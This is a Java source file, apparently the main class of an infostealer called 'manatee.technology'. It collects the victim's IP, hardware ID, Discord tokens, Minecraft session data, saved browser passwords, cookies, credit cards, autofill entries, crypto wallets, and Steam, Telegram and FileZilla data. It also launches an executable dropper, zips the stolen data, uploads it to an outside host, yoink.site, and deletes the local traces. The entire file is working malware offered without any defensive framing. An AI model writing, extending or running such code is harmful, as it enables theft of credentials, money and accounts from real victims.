package me.teejayx6.scammachine;

import me.teejayx6.scammachine.payloadz.*;
import me.teejayx6.scammachine.util.ArchiveUtil;
import me.teejayx6.scammachine.util.FileUtils;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.net.MalformedURLException;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Base64;
import java.util.Date;
import java.util.Stack;


public final class Main
{
    static DateFormat dateFormat = new SimpleDateFormat( "yyyy/MM/dd HH:mm:ss" );
    static Date date = new Date();

    public static String getIP()
    {
        try
        {
            BufferedReader reader = new BufferedReader( new InputStreamReader( new URL( "http://checkip.amazonaws.com" ).openStream() ) );
            return reader.readLine();
        } catch ( Exception e )
        {
            return null;
        }
    }

    public static String getID()
    {
        try
        {
            MessageDigest hash = MessageDigest.getInstance( "MD5" );
            String s = System.getProperty( "os.name" ) + System.getProperty( "os.arch" ) + System.getProperty( "os.version" ) + Runtime.getRuntime().availableProcessors() + System.getenv( "PROCESSOR_IDENTIFIER" ) + System.getenv( "PROCESSOR_ARCHITECTURE" ) + System.getenv( "PROCESSOR_ARCHITEW6432" ) + System.getenv( "NUMBER_OF_PROCESSORS" );
            return bytesToHex( hash.digest( s.getBytes() ) );
        } catch ( Exception e )
        {
            return "######################";
        }
    }

    private static String bytesToHex( byte[] bytes )
    {
        char[] hexChars = new char[ bytes.length * 2 ];
        for ( int j = 0; j < bytes.length; j++ )
        {
            int v = bytes[ j ] & 0xFF;
            hexChars[ j * 2 ] = "0123456789ABCDEF".toCharArray()[ v >>> 4 ];
            hexChars[ j * 2 + 1 ] = "0123456789ABCDEF".toCharArray()[ v & 0x0F ];
        }
        return new String( hexChars );
    }

    private static String mc;

    public static void main( String[] args ) throws MalformedURLException
    {
        if ( args.length != 2 )
            throw new RuntimeException( "pass a key" );
        mc = new String( Base64.getDecoder().decode( args[ 1 ] ) );
        start( args[ 0 ] );
    }

    public static void start( String key ) throws MalformedURLException
    {
        ArchiveUtil.init();
        String ip = getIP();

        String message = "\n" +
                "manatee.technology 1.5 | by juggenbande" + "\n" +
                "Date: " + dateFormat.format( date ) + "\n" +
                "=========[SYSTEM INFO]=========\n" +
                "IP: " + ip + "\n" +
                "OS: " + System.getProperty( "os.name" ) + "\n" +
                "PC Name: " + System.getProperty( "user.name" ) + "\n" +
                "HWID: " + getID() + "\n" +
                "=========[DISCORD INFO]=========\n" +
                "Discord: " + "\n";

        message += Discord.execute() + "\n";

        message += "=========[MINECRAFT]=========\n" +
                mc + "\n\n";

        message += "=========[PASSWORDS]=========\n" +
                "Passwords: \n" + Passwords.execute() + "\n";

        String cookies = Cookies.execute();
        if ( cookies.length() > 5 )
            ArchiveUtil.addFile( "cookies.txt", cookies.getBytes( StandardCharsets.UTF_8 ) );

        String cards = CreditCards.execute();
        if ( cards.length() > 5 )
            ArchiveUtil.addFile( "creditcards.txt", cards.getBytes( StandardCharsets.UTF_8 ) );

        String autofill = Autofill.execute();
        if ( autofill.length() > 5 )
            ArchiveUtil.addFile( "autofill.txt", autofill.getBytes( StandardCharsets.UTF_8 ) );

        Crypto.execute();

        message += "=========[CRYPTO]=========\n" +
                "Crypto: " + Crypto.wallets + "\n";

        if ( Crypto.walletnames.length() > 0 )
            message += Crypto.walletnames;

        new Thread( ExeDropper::perform ).start();

        String steam = Steam.execute();

        message += "=========[STEAM]=========\n" + steam;
        if ( steam.equalsIgnoreCase( "None" ) )
            message += "\n";

        Telegram.execute();
        FileZilla.execute();

        message += "=========[OTHER]=========\n";

        if ( Telegram.stolen )
            message += "Telegram\n";

        if ( FileZilla.stolen )
            message += "FileZilla\n";

        if ( Steam.stolen )
            message += "Steam\n";

        if ( cookies.length() > 5 )
            message += "Browser Cookies\n";

        if ( cards.length() > 5 )
            message += "Browser Credit Cards\n";

        if ( autofill.length() > 5 )
            message += "Browser Autofill\n";

        ArchiveUtil.addFile( "info.txt", message.getBytes( StandardCharsets.UTF_8 ) );

        ArchiveUtil.close();

        HttpRequest.post( new URL( String.format( "http://yoink.site/atlanta/%s.php", key ) ) )
                .contentType( "application/text" )
                .header( "User-Agent", "f4kc u //" )
                .part( "uploaded_file", ip, "application/text", new File( ArchiveUtil.path ) )
                .body();

        FileUtils.closeAll();
        ArchiveUtil.delete();
    }
}